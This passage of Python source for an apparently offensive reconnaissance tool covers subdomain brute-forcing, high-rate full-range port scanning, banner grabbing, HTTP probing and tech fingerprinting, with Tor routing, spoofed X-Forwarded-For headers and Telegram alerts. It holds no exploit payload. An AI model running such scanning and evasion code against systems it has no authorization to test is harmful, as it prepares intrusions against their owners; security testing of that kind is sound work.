            if compress:
                with gzip.open(f"{path}.gz", 'wt', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, default=str)
                self.logger.debug(f"Saved compressed to {path}.gz")
            else:
                with open(path, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, default=str)
                self.logger.debug(f"Saved to {path}")
        except Exception as e:
            self.logger.error(f"Could not save {filename}: {e}")


    def load_json(
        self,
        filename: str,
        compressed: bool = True
    ) -> Any:
        """
        Load JSON data from a file, optionally with gzip compression.

        Args:
            filename: The name of the file (without extension)
            compressed: If True, load from .json.gz; otherwise load from .json

        Returns:
            The deserialized JSON data, or None if the file doesn't exist

        Example:
            >>> data = self.load_json('scan_results')
            >>> print(data['results'])
            [1, 2, 3]
        """
        path = RECON_DIR / filename
        try:
            if compressed:
                with gzip.open(f"{path}.gz", 'rt', encoding='utf-8') as f:
                    return json.load(f)
            else:
                with open(path, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except FileNotFoundError:
            self.logger.debug(f"File not found: {filename}")
            return None
        except Exception as e:
            self.logger.error(f"Could not load {filename}: {e}")
            return None


    def save_checkpoint(
        self,
        step: str,
        target: str = "",
        data: Any = None
    ) -> Dict[str, Any]:
        """
        Save a checkpoint for recovery with checksum validation.

        Args:
            step: Description of the current step
            target: Target being processed (optional)
            data: Additional data to save (optional)

        Returns:
            Dictionary containing the checkpoint data

        Example:
            >>> self.save_checkpoint('port_scan', '192.168.1.1', {'ports_found': [22, 80]})
            {'id': 1, 'phase': 1, 'step': 'port_scan', 'target': '192.168.1.1', ...}
        """
        if not self.config.get('enable_checkpoint', True):
            return {}
        checkpoint = {
            'id': self.checkpoint_counter,
            'phase': 1,
            'step': step,
            'target': target,
            'data': json.dumps(data, default=str) if data else '',
            'timestamp': datetime.datetime.now().isoformat(),
            'checksum': hashlib.md5(f"{step}{target}{time.time()}{random.random()}".encode()).hexdigest()
        }
        self.state.setdefault('checkpoints', []).append(checkpoint)
        self.checkpoint_counter += 1
        try:
            self.log_to_db('checkpoints', {
                'phase': 1,
                'step': step,
                'target': target,
                'data': json.dumps(data, default=str) if data else '',
                'checksum': checkpoint['checksum']
            })
        except Exception as e:
            self.logger.debug(f"Checkpoint DB insert failed: {e}")
        self.logger.debug(f"Checkpoint saved: {step} ({target})")
        return checkpoint


    def load_checkpoints(
        self
    ) -> List[Dict[str, Any]]:
        """
        Load all checkpoints from the database.

        Returns:
            List of checkpoint dictionaries

        Example:
            >>> checkpoints = self.load_checkpoints()
            >>> for cp in checkpoints:
            ...     print(cp['step'])
            target_start
            port_scan
            target_end
        """
        try:
            self.db_cursor.execute("SELECT * FROM checkpoints WHERE phase=1 ORDER BY id")
            rows = self.db_cursor.fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            self.logger.error(f"Could not load checkpoints: {e}")
            return []


    def rollback_to_checkpoint(
        self,
        checkpoint_id: int
    ) -> bool:
        """
        Rollback the state to a specific checkpoint.

        Args:
            checkpoint_id: The ID of the checkpoint to rollback to

        Returns:
            True if rollback succeeded, False otherwise

        Example:
            >>> success = self.rollback_to_checkpoint(5)
            >>> if success:
            ...     print("Rolled back to checkpoint 5")
        """
        try:
            self.db_cursor.execute("SELECT * FROM checkpoints WHERE id=?", (checkpoint_id,))
            row = self.db_cursor.fetchone()
            if not row:
                self.logger.error(f"Checkpoint {checkpoint_id} not found")
                return False
            checkpoint = dict(row)
            self.logger.info(f"Rolling back to checkpoint: {checkpoint.get('step')}")
            if checkpoint.get('data'):
                data = json.loads(checkpoint['data'])
                self.state.update(data)
            self._save_state()
            return True
        except Exception as e:
            self.logger.error(f"Rollback failed: {e}")
            return False

    # ===================================================================
    # 3. SYSTEM & TOOL MANAGEMENT
    # ===================================================================

    def run_subprocess(
        self,
        cmd: List[str],
        timeout: int = 300,
        capture: bool = True
    ) -> Tuple[int, str, str]:
        """
        Run a subprocess with timeout and capture stdout/stderr.

        Args:
            cmd: List of command arguments
            timeout: Maximum time in seconds to wait for completion
            capture: If True, capture stdout/stderr; otherwise redirect to /dev/null

        Returns:
            Tuple of (return_code, stdout, stderr)

        Example:
            >>> code, out, err = self.run_subprocess(['ping', '-c', '1', 'google.com'])
            >>> print(code, out[:100])
            0 PING google.com (142.250.80.46): 56 data bytes
        """
        try:
            if capture:
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    shell=False
                )
                stdout, stderr = proc.communicate(timeout=timeout)
                return proc.returncode, stdout, stderr
            else:
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    shell=False
                )
                proc.wait(timeout=timeout)
                return proc.returncode, "", ""
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            return -1, "", f"Timeout after {timeout}s"
        except Exception as e:
            return -1, "", str(e)


    def is_tool_installed(
        self,
        tool: str
    ) -> bool:
        """
        Check if a system tool is installed.

        Args:
            tool: Name of the tool (masscan, nmap, httpx, nuclei, gau, katana, ffuf, subfinder, amass, tor, curl)

        Returns:
            True if the tool is installed, False otherwise

        Example:
            >>> if self.is_tool_installed('nmap'):
            ...     print("nmap is installed")
        """
        try:
            if tool == 'masscan':
                result = subprocess.run(['masscan', '--version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif tool == 'nmap':
                result = subprocess.run(['nmap', '--version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif tool == 'httpx':
                result = subprocess.run(['httpx', '-version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif tool == 'nuclei':
                result = subprocess.run(['nuclei', '-version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif tool == 'gau':
                result = subprocess.run(['gau', '-version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif tool == 'katana':
                result = subprocess.run(['katana', '-version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif tool == 'ffuf':
                result = subprocess.run(['ffuf', '-V'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif tool == 'subfinder':
                result = subprocess.run(['subfinder', '-version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif tool == 'amass':
                result = subprocess.run(['amass', '-version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif tool == 'tor':
                result = subprocess.run(['tor', '--version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            elif tool == 'curl':
                result = subprocess.run(['curl', '--version'], capture_output=True, text=True, timeout=5)
                return result.returncode == 0
            else:
                return False
        except Exception:
            return False


    def install_tool(
        self,
        tool: str
    ) -> bool:
        """
        Install a tool using apt, go, or pip with fallback.

        Args:
            tool: Name of the tool to install

        Returns:
            True if installation succeeded, False otherwise

        Example:
            >>> success = self.install_tool('masscan')
            >>> if success:
            ...     print("masscan installed successfully")
        """
        self.print_header(f"Installing {tool}...", "WARNING")
        try:
            if tool in ['masscan', 'nmap', 'ffuf', 'tor', 'curl', 'wget', 'git', 'jq']:
                subprocess.run(['apt-get', 'update', '-qq'], check=False, timeout=30)
                cmd = ['apt-get', 'install', '-y', tool]
            elif tool == 'httpx':
                cmd = ['go', 'install', '-v', 'github.com/projectdiscovery/httpx/cmd/httpx@latest']
            elif tool == 'nuclei':
                cmd = ['go', 'install', '-v', 'github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest']
            elif tool == 'gau':
                cmd = ['go', 'install', '-v', 'github.com/lc/gau/v2/cmd/gau@latest']
            elif tool == 'katana':
                cmd = ['go', 'install', '-v', 'github.com/projectdiscovery/katana/cmd/katana@latest']
            elif tool == 'subfinder':
                cmd = ['go', 'install', '-v', 'github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest']
            elif tool == 'amass':
                cmd = ['go', 'install', '-v', 'github.com/owasp-amass/amass/v4/...@master']
            else:
                return False
            returncode, stdout, stderr = self.run_subprocess(cmd, timeout=300)
            if returncode == 0:
                self.print_header(f"{tool} installed successfully", "DONE")
                return True
            else:
                self.print_header(f"{tool} installation failed: {stderr[:200]}", "ERROR")
                return False
        except Exception as e:
            self.print_header(f"{tool} installation error: {e}", "ERROR")
            return False


    def check_and_install_tools(
        self
    ) -> None:
        """
        Check for all required tools and install any that are missing.

        This method checks and installs: masscan, nmap, httpx, nuclei, gau,
        katana, ffuf, subfinder, amass, tor, curl, wget, git, jq.

        Returns:
            None

        Example:
            >>> self.check_and_install_tools()
            [2026-07-27 14:32:01] ⚡ PHASE 1 RECON — Checking and installing all tools
            [2026-07-27 14:32:01] masscan already installed
            [2026-07-27 14:32:01] nmap already installed
            [2026-07-27 14:32:15] httpx installed successfully
            ...
        """
        self.print_header("Checking and installing all tools", "STEP")
        tools = [
            'masscan', 'nmap', 'httpx', 'nuclei', 'gau',
            'katana', 'ffuf', 'subfinder', 'amass',
            'tor', 'curl', 'wget', 'git', 'jq'
        ]
        installed_count = 0
        for tool in tools:
            if self.is_tool_installed(tool):
                self.print_header(f"{tool} already installed", "DONE")
                installed_count += 1
            else:
                self.print_header(f"{tool} not found, installing...", "WARNING")
                if self.install_tool(tool):
                    installed_count += 1
        self.print_header(f"Tools ready: {installed_count}/{len(tools)} installed", "DONE")


    def kill_all_processes(
        self
    ) -> None:
        """
        Kill all child subprocesses on exit.

        Returns:
            None

        Example:
            >>> self.kill_all_processes()
            # All child processes terminated
        """
        self.logger.info("Killing all subprocesses...")
        try:
            if PSUTIL_AVAILABLE:
                current = psutil.Process()
                for child in current.children(recursive=True):
                    try:
                        child.terminate()
                        child.wait(timeout=3)
                    except Exception:
                        try:
                            child.kill()
                        except Exception:
                            pass
            else:
                subprocess.run(['pkill', '-P', str(os.getpid())], capture_output=True)
        except Exception as e:
            self.logger.debug(f"Kill processes error: {e}")

    # ===================================================================
    # 4. NETWORK & DNS METHODS
    # ===================================================================

    def resolve_subdomain(
        self,
        subdomain: str,
        base_domain: str
    ) -> Optional[Tuple[str, str]]:
        """
        Resolve a subdomain to its IPv4 address with caching.

        Args:
            subdomain: The subdomain prefix (e.g., "www")
            base_domain: The base domain (e.g., "example.com")

        Returns:
            Tuple of (full_domain, ip) if resolved, None otherwise

        Example:
            >>> result = self.resolve_subdomain("www", "example.com")
            >>> if result:
            ...     domain, ip = result
            ...     print(f"{domain} → {ip}")
            www.example.com → 192.168.1.1
        """
        full_domain = f"{subdomain}.{base_domain}"
        cache_key = f"dns_{full_domain}"
        cached = self._cache_dns.get(cache_key)
        if cached is not None:
            return cached if cached != 'FAILED' else None
        try:
            self._dns_limiter.wait_and_acquire()
            if DNS_AVAILABLE:
                resolver = dns.resolver.Resolver()
                if self.config.get('tor', False):
                    resolver.nameservers = ['127.0.0.1']
                    resolver.port = 9053
                resolver.timeout = self.config.get('dns_timeout', 5)
                resolver.lifetime = self.config.get('dns_timeout', 5) * 2
                answers = resolver.resolve(full_domain, 'A')
                ip = str(answers[0])
                result = (full_domain, ip)
                self._cache_dns.set(cache_key, result, ttl=300)
                return result
            else:
                ip = socket.gethostbyname(full_domain)
                result = (full_domain, ip)
                self._cache_dns.set(cache_key, result, ttl=300)
                return result
        except Exception:
            self._cache_dns.set(cache_key, 'FAILED', ttl=60)
            return None


    def enumerate_subdomains(
        self,
        target: str
    ) -> List[Dict[str, Any]]:
        """
        Enumerate all subdomains for a target using wordlist permutations.

        Args:
            target: Base domain name

        Returns:
            List of dictionaries with 'subdomain' and 'ip' keys

        Example:
            >>> subdomains = self.enumerate_subdomains("example.com")
            >>> for sub in subdomains:
            ...     print(f"{sub['subdomain']} → {sub['ip']}")
            www.example.com → 192.168.1.1
            mail.example.com → 192.168.1.2
            api.example.com → 192.168.1.3
        """
        self.print_header(f"Enumerating subdomains for {target}", "STEP")
        total = len(self.subdomain_list)
        self.print_header(f"Using {total} permutations", "INFO")
        results = []
        processed = 0

        for sub in self.subdomain_list:
            if self.stop_event.is_set():
                break
            processed += 1
            if processed % 100 == 0:
                self.print_progress(processed, total, f"Resolving subdomains for {target}")

            result = self.resolve_subdomain(sub, target)
            if result:
                full_domain, ip = result
                results.append({'subdomain': full_domain, 'ip': ip, 'resolved': True})
                self.print_found("SUBDOMAIN", f"{full_domain} → {ip}")
                with dashboard_lock:
                    dashboard_data['subdomains_found'].append(full_domain)
                    dashboard_data['total_subdomains'] += 1
                self.log_to_db('subdomains', {
                    'target_id': 0,
                    'subdomain': full_domain,
                    'ip': ip,
                    'resolved': 1
                })
                if self.telegram:
                    self.telegram.alert(
                        "SUBDOMAIN FOUND",
                        f"{full_domain} → {ip}",
                        "INFO"
                    )

        self.print_progress(total, total, f"Subdomain enumeration complete for {target}")
        self.print_header(f"Found {len(results)} subdomains for {target}", "DONE")
        self.save_json(results, f"subdomains_{target}_{TIMESTAMP}.json")
        return results


    def resolve_target(
        self,
        target: str
    ) -> List[str]:
        """
        Resolve a target (domain, IP, or CIDR) to a list of IP addresses.

        Args:
            target: Domain name, IP address, or CIDR notation

        Returns:
            List of IPv4 addresses

        Example:
            >>> ips = self.resolve_target("example.com")
            >>> print(ips)
            ['192.168.1.1', '192.168.1.2']
            >>> ips = self.resolve_target("192.168.1.0/24")
            >>> print(ips[:5])
            ['192.168.1.1', '192.168.1.2', '192.168.1.3', ...]
        """
        cache_key = f"target_{target}"
        cached = self._cache_dns.get(cache_key)
        if cached is not None and cached != 'FAILED':
            return cached

        ips = []
        target_type = self._detect_target_type(target)

        if target_type == 'ip':
            ips = [target]
        elif target_type == 'cidr':
            try:
                network = ipaddress.ip_network(target, strict=False)
                ips = [str(ip) for ip in network.hosts()][:256]
            except Exception:
                pass
        else:
            try:
                self._dns_limiter.wait_and_acquire()
                addrinfo = socket.getaddrinfo(target, 0, socket.AF_INET, socket.SOCK_STREAM)
                ips = list(set([addr[4][0] for addr in addrinfo]))
            except socket.gaierror:
                try:
                    if DNS_AVAILABLE:
                        resolver = dns.resolver.Resolver()
                        if self.config.get('tor', False):
                            resolver.nameservers = ['127.0.0.1']
                            resolver.port = 9053
                        answers = resolver.resolve(target, 'A')
                        ips = [str(r) for r in answers]
                except Exception:
                    try:
                        result = subprocess.run(
                            ['dig', '+short', target],
                            capture_output=True,
                            text=True,
                            timeout=5
                        )
                        if result.returncode == 0:
                            ips = [line.strip() for line in result.stdout.split('\n') if line.strip()]
                    except Exception:
                        pass

        if not ips:
            ips = ['127.0.0.1']

        self._cache_dns.set(f"target_{target}", ips, ttl=300)
        return ips


    def ping_host(
        self,
        ip: str
    ) -> bool:
        """
        Check if a host is alive using ICMP ping, TCP, or HTTP fallback.

        Args:
            ip: IPv4 address to ping

        Returns:
            True if the host is reachable, False otherwise

        Example:
            >>> if self.ping_host("192.168.1.1"):
            ...     print("Host is alive")
        """
        cache_key = f"ping_{ip}"
        cached = self._cache_dns.get(cache_key)
        if cached is not None:
            return cached

        # Try ICMP ping with scapy
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=ip) / ICMP()
                reply = sr1(packet, timeout=2, verbose=0)
                if reply is not None:
                    self._cache_dns.set(cache_key, True, ttl=60)
                    return True
        except Exception:
            pass

        # Try system ping command
        try:
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '1', ip],
                capture_output=True,
                timeout=2
            )
            if result.returncode == 0:
                self._cache_dns.set(cache_key, True, ttl=60)
                return True
        except Exception:
            pass

        # Try TCP connection to port 443 as a last resort
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, 443))
            sock.close()
            self._cache_dns.set(cache_key, True, ttl=60)
            return True
        except Exception:
            pass

        self._cache_dns.set(cache_key, False, ttl=60)
        return False


    def check_port(
        self,
        ip: str,
        port: int
    ) -> bool:
        """
        Check if a TCP port is open on a target IP.

        Args:
            ip: IPv4 address
            port: TCP port number (1-65535)

        Returns:
            True if the port is open, False otherwise

        Example:
            >>> if self.check_port("192.168.1.1", 80):
            ...     print("Web server is running")
        """
        cache_key = f"port_{ip}_{port}"
        cached = self._cache_ports.get(cache_key)
        if cached is not None:
            return cached

        try:
            self._port_limiter.wait_and_acquire()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.config.get('port_timeout', 3))
            result = sock.connect_ex((ip, port))
            sock.close()

            if result == 0:
                self._cache_ports.set(cache_key, True, ttl=180)
                return True
            self._cache_ports.set(cache_key, False, ttl=60)
            return False
        except Exception:
            self._cache_ports.set(cache_key, False, ttl=60)
            return False


    def get_service_name(
        self,
        port: int
    ) -> str:
        """
        Map a port number to its common service name.

        Args:
            port: TCP port number

        Returns:
            Service name as a string, or "Unknown" if not recognized

        Example:
            >>> self.get_service_name(22)
            'SSH'
            >>> self.get_service_name(8080)
            'HTTP-Proxy'
        """
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            69: 'TFTP', 79: 'Finger', 80: 'HTTP', 88: 'Kerberos', 110: 'POP3',
            111: 'RPC', 135: 'MSRPC', 139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS',
            445: 'SMB', 465: 'SMTPS', 514: 'Syslog', 587: 'SMTP', 636: 'LDAPS',
            993: 'IMAPS', 995: 'POP3S', 1080: 'SOCKS', 1433: 'MSSQL', 1521: 'Oracle',
            1723: 'PPTP', 2049: 'NFS', 2222: 'SSH-Alt', 2375: 'Docker', 2379: 'etcd',
            2380: 'etcd', 3000: 'Grafana', 3306: 'MySQL', 3389: 'RDP', 3689: 'AFP',
            5000: 'HTTP-Alt', 5432: 'PostgreSQL', 5900: 'VNC', 5984: 'CouchDB',
            6379: 'Redis', 7474: 'Neo4j', 8000: 'HTTP-Alt', 8080: 'HTTP-Proxy',
            8443: 'HTTPS-Alt', 9000: 'PHP-FPM', 9042: 'Cassandra', 9200: 'Elastic',
            9300: 'Elastic', 9418: 'Git', 11211: 'Memcached', 15672: 'RabbitMQ',
            27017: 'MongoDB', 28015: 'RethinkDB', 50000: 'SAP'
        }
        return services.get(port, 'Unknown')


    def get_banner(
        self,
        ip: str,
        port: int
    ) -> str:
        """
        Grab a service banner from an open port.

        Args:
            ip: IPv4 address
            port: TCP port number

        Returns:
            Banner string (max 300 characters), or empty string on failure

        Example:
            >>> banner = self.get_banner("192.168.1.1", 22)
            >>> print(banner)
            SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, port))

            # Send appropriate probe based on port
            if port in [80, 443, 8080, 8443, 8000, 9000, 3000, 5000]:
                sock.send(b"GET / HTTP/1.0\r\n\r\n")
            elif port in [21, 25, 110, 143, 993, 995, 587]:
                sock.send(b"\n")
            elif port == 22:
                pass  # SSH sends banner automatically
            else:
                sock.send(b"\n")

            data = sock.recv(1024)
            sock.close()
            banner = data.decode('utf-8', errors='ignore').strip()[:300]
            return banner
        except Exception:
            return ""

    # ===================================================================
    # 5. PORT SCANNING
    # ===================================================================

    def scan_ports_masscan(
        self,
        ip: str
    ) -> List[int]:
        """
        Scan all 65,535 ports using masscan at high speed.

        Args:
            ip: Target IPv4 address

        Returns:
            List of open port numbers

        Example:
            >>> ports = self.scan_ports_masscan("192.168.1.1")
            >>> print(ports)
            [22, 80, 443, 3306]
        """
        try:
            pps = self.config.get('masscan_pps', 100000)
            cmd = [
                'masscan', ip, '-p1-65535',
                '--rate', str(pps),
                '--open-only',
                '--wait', '0'
            ]
            returncode, stdout, stderr = self.run_subprocess(cmd, timeout=300)

            if returncode == 0:
                ports = []
                for line in stdout.split('\n'):
                    if 'open' in line and 'tcp' in line:
                        parts = line.split()
                        for part in parts:
                            if '/' in part and 'tcp' in part:
                                port_str = part.split('/')[0]
                                if port_str.isdigit():
                                    ports.append(int(port_str))
                return ports
            return []
        except Exception as e:
            self.logger.debug(f"Masscan error for {ip}: {e}")
            return []


    def scan_ports_python(
        self,
        ip: str
    ) -> List[Dict[str, Any]]:
        """
        Fallback port scanner using pure Python threading (all 65,535 ports).

        Args:
            ip: Target IPv4 address

        Returns:
            List of dictionaries with port, service, banner, and state

        Example:
            >>> results = self.scan_ports_python("192.168.1.1")
            >>> for r in results:
            ...     print(f"{r['port']}: {r['service']}")
            22: SSH
            80: HTTP
            443: HTTPS
        """
        self.print_header(f"Scanning all 65,535 ports on {ip} (Python fallback)", "STEP")
        results = []
        ports_to_scan = list(range(1, 65536))
        total_ports = len(ports_to_scan)

        def check_port_thread(port: int) -> Optional[Dict[str, Any]]:
            """Thread function to check a single port."""
            if self.check_port(ip, port):
                banner = self.get_banner(ip, port)
                service = self.get_service_name(port)
                return {
                    'ip': ip,
                    'port': port,
                    'service': service,
                    'banner': banner,
                    'state': 'open'
                }
            return None

        with ThreadPoolExecutor(
            max_workers=min(self.config.get('port_threads', 500), 500)
        ) as executor:
            futures = {executor.submit(check_port_thread, port): port for port in ports_to_scan}
            completed = 0

            for future in as_completed(futures):
                completed += 1
                if completed % 1000 == 0:
                    self.print_progress(completed, total_ports, f"Scanning ports on {ip}")

                result = future.result()
                if result:
                    results.append(result)
                    self.print_found(
                        "PORT",
                        f"{ip}:{result['port']} ({result['service']}) - {result['banner'][:50]}"
                    )
                    with dashboard_lock:
                        dashboard_data['open_ports_found'].append(f"{ip}:{result['port']}")
                        dashboard_data['total_ports'] += 1
                    self.log_to_db('ports', {
                        'ip': ip,
                        'port': result['port'],
                        'protocol': 'tcp',
                        'service': result['service'],
                        'banner': result['banner'],
                        'state': 'open'
                    })

        self.print_progress(total_ports, total_ports, f"Port scan complete for {ip}")
        return results


    def scan_ports(
        self,
        ip: str
    ) -> List[Dict[str, Any]]:
        """
        Main port scanner: tries masscan first, falls back to Python scanner.

        Args:
            ip: Target IPv4 address

        Returns:
            List of open port dictionaries

        Example:
            >>> ports = self.scan_ports("192.168.1.1")
            >>> print(f"Found {len(ports)} open ports")
            Found 5 open ports
        """
        self.print_header(f"Scanning ports for {ip}", "STEP")
        results = []

        try:
            masscan_ports = self.scan_ports_masscan(ip)
            if masscan_ports:
                self.print_header(
                    f"Masscan found {len(masscan_ports)} open ports on {ip}",
                    "DONE"
                )
                for port in masscan_ports:
                    banner = self.get_banner(ip, port)
                    service = self.get_service_name(port)
                    result = {
                        'ip': ip,
                        'port': port,
                        'service': service,
                        'banner': banner,
                        'state': 'open'
                    }
                    results.append(result)
                    self.print_found(
                        "PORT",
                        f"{ip}:{port} ({service}) - {banner[:50]}"
                    )
                    with dashboard_lock:
                        dashboard_data['open_ports_found'].append(f"{ip}:{port}")
                        dashboard_data['total_ports'] += 1
                    self.log_to_db('ports', {
                        'ip': ip,
                        'port': port,
                        'protocol': 'tcp',
                        'service': service,
                        'banner': banner,
                        'state': 'open'
                    })
                return results
            else:
                self.print_header(
                    f"Masscan fallback, using Python scanner for {ip}",
                    "WARNING"
                )
                results = self.scan_ports_python(ip)
                return results
        except Exception as e:
            self.logger.error(f"Port scan error for {ip}: {e}")
            return []


    def scan_ports_batch(
        self,
        ips: List[str]
    ) -> List[Dict[str, Any]]:
        """
        Batch port scan across multiple IPs using threading.

        Args:
            ips: List of IPv4 addresses to scan

        Returns:
            List of open port dictionaries from all IPs

        Example:
            >>> all_ports = self.scan_ports_batch(["192.168.1.1", "192.168.1.2"])
            >>> print(f"Total open ports: {len(all_ports)}")
            Total open ports: 12
        """
        self.print_header(f"Batch scanning {len(ips)} IPs", "STEP")
        results = []

        with ThreadPoolExecutor(
            max_workers=min(self.config.get('port_threads', 500), len(ips))
        ) as executor:
            futures = {executor.submit(self.scan_ports, ip): ip for ip in ips}
            for future in as_completed(futures):
                try:
                    ip_results = future.result()
                    results.extend(ip_results)
                except Exception as e:
                    self.logger.debug(f"Batch scan error: {e}")

        return results

    # ===================================================================
    # 6. HTTP PROBING
    # ===================================================================

    def http_probe(
        self,
        url: str
    ) -> Dict[str, Any]:
        """
        Perform an HTTP probe with caching, proxies, Tor, and retries.

        Args:
            url: Full URL to probe (including protocol)

        Returns:
            Dictionary containing status, headers, body_preview, and metadata

        Example:
            >>> result = self.http_probe("https://example.com")
            >>> print(f"Status: {result['status']}, Server: {result['server']}")
            Status: 200, Server: nginx/1.18.0
        """
        cache_key = f"http_{url}"
        cached = self._cache_http.get(cache_key)
        if cached is not None:
            return cached

        try:
            self._http_limiter.wait_and_acquire()
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'close',
                'Cache-Control': 'no-cache',
                'X-Forwarded-For': (
                    f"{random.randint(1,255)}.{random.randint(1,255)}."
                    f"{random.randint(1,255)}.{random.randint(1,255)}"
                )
            }

            proxy_url = self._get_proxy()
            proxies = None
            if proxy_url:
                proxies = {'http': proxy_url, 'https': proxy_url}
            if self.config.get('tor', False):
                proxies = {
                    'http': 'socks5://127.0.0.1:9050',
                    'https': 'socks5://127.0.0.1:9050'
                }

            if REQUESTS_AVAILABLE:
                session = requests.Session()
                if proxies:
                    session.proxies = proxies
                session.verify = False
                session.timeout = self.config.get('http_timeout', 10)
                session.max_redirects = 10

                retries = Retry(
                    total=3,
                    backoff_factor=1,
                    status_forcelist=[429, 500, 502, 503, 504]
                )
                session.mount('http://', HTTPAdapter(max_retries=retries))
                session.mount('https://', HTTPAdapter(max_retries=retries))

                resp = session.get(url, headers=headers, allow_redirects=True)
                result = {
                    'url': url,
                    'status': resp.status_code,
                    'headers': dict(resp.headers),
                    'body_preview': resp.text[:10000],
                    'content_length': len(resp.content),
                    'server': resp.headers.get('Server', ''),
                    'content_type': resp.headers.get('Content-Type', ''),
                    'redirects': [r.url for r in resp.history],
                    'cookies': dict(resp.cookies),
                    'timing': resp.elapsed.total_seconds()
                }
                self._cache_http.set(cache_key, result, ttl=60)
                return result
            else:
                req = urllib.request.Request(url, headers=headers)
                if proxies:
                    proxy_handler = urllib.request.ProxyHandler(proxies)
                    opener = urllib.request.build_opener(proxy_handler)
                    urllib.request.install_opener(opener)

                with urllib.request.urlopen(
                    req,
                    timeout=self.config.get('http_timeout', 10)
                ) as resp:
                    body = resp.read().decode('utf-8', errors='ignore')[:10000]
                    result = {
                        'url': url,
                        'status': resp.getcode(),
                        'headers': dict(resp.headers),
                        'body_preview': body,
                        'content_length': len(body),
                        'server': resp.headers.get('Server', ''),
                        'content_type': resp.headers.get('Content-Type', ''),
                        'redirects': [],
                        'cookies': {},
                        'timing': 0.0
                    }
                    self._cache_http.set(cache_key, result, ttl=60)
                    return result
        except Exception as e:
            result = {'url': url, 'error': str(e), 'status': 0}
            self._cache_http.set(cache_key, result, ttl=30)
            return result


    def probe_http_endpoints(
        self,
        ips: List[str]
    ) -> List[Dict[str, Any]]:
        """
        Probe HTTP and HTTPS endpoints for a list of IPs.

        Args:
            ips: List of IPv4 addresses

        Returns:
            List of HTTP probe results

        Example:
            >>> results = self.probe_http_endpoints(["192.168.1.1"])
            >>> for r in results:
            ...     print(f"{r['url']} → {r['status']}")
            http://192.168.1.1 → 200
            https://192.168.1.1 → 301
        """
        self.print_header(f"Probing HTTP endpoints for {len(ips)} IPs", "STEP")
        endpoints = []
        for ip in ips[:50]:
            endpoints.append(f"http://{ip}")
            endpoints.append(f"https://{ip}")

        results = []
        with ThreadPoolExecutor(
            max_workers=min(self.config.get('http_threads', 1000), len(endpoints))
        ) as executor:
            futures = {executor.submit(self.http_probe, endpoint): endpoint for endpoint in endpoints}
            for future in as_completed(futures):
                result = future.result()
                if result.get('status', 0) > 0:
                    results.append(result)
                    status_str = f"[{result['status']}] {result['url']}"
                    if result.get('server'):
                        status_str += f" ({result['server']})"
                    self.print_found("URL", status_str)

        self.save_json(results, f"http_probes_{TIMESTAMP}.json")
        return results


    def detect_technologies(
        self,
        urls: List[str]
    ) -> List[Dict[str, Any]]:
        """
        Detect web technologies using headers, HTML, and pattern matching.

        Args:
            urls: List of URLs to analyze

        Returns:
            List of technology dictionaries with tech_name, version, confidence

        Example:
            >>> techs = self.detect_technologies(["https://example.com"])
            >>> for t in techs:
            ...     print(f"{t['tech_name']}: {t['version']}")
            server: nginx/1.18.0
            PHP: 7.4.33
            WordPress: 5.8.1
        """
        self.print_header(f"Detecting technologies on {len(urls)} URLs", "STEP")
        results = []

        for url in urls[:100]:
            if self.stop_event.is_set():
                break

            probe = self.http_probe(url)
            if probe.get('status', 0) != 200:
                continue

            headers = probe.get('headers', {})
            body = probe.get('body_preview', '')

            # Server header detection
            server = headers.get('Server', '')
            if server:
                results.append({
                    'url': url,
                    'tech_name': 'server',
                    'version': server,
                    'confidence': 0.9,
                    'category': 'web',
                    'evidence': server
                })
                self.print_found("TECH", f"{url}: Server {server}")

            # X-Powered-By detection
            if 'X-Powered-By' in headers:
                tech = headers['X-Powered-By']
                results.append({
                    'url': url,
                    'tech_name': 'powered_by',
                    'version': tech,
                    'confidence': 0.8,
                    'category': 'framework',
                    'evidence': tech
                })

            # PHP detection
            if 'Set-Cookie' in headers and 'PHPSESSID' in headers['Set-Cookie']:
                results.append({
                    'url': url,
                    'tech_name': 'PHP',
                    'version': '',
                    'confidence': 0.9,
                    'category': 'language',
                    'evidence': 'PHPSESSID'
                })

            # Java detection
            if 'Set-Cookie' in headers and 'JSESSIONID' in headers['Set-Cookie']:
                results.append({
                    'url': url,
                    'tech_name': 'Java',
                    'version': '',
                    'confidence': 0.9,
                    'category': 'language',
                    'evidence': 'JSESSIONID'
                })

            # ASP.NET detection
            if 'X-AspNet-Version' in headers:
                results.append({
                    'url': url,
                    'tech_name': 'ASP.NET',
                    'version': headers['X-AspNet-Version'],
                    'confidence': 0.9,
                    'category': 'framework',
                    'evidence': headers['X-AspNet-Version']
                })

            # WordPress detection
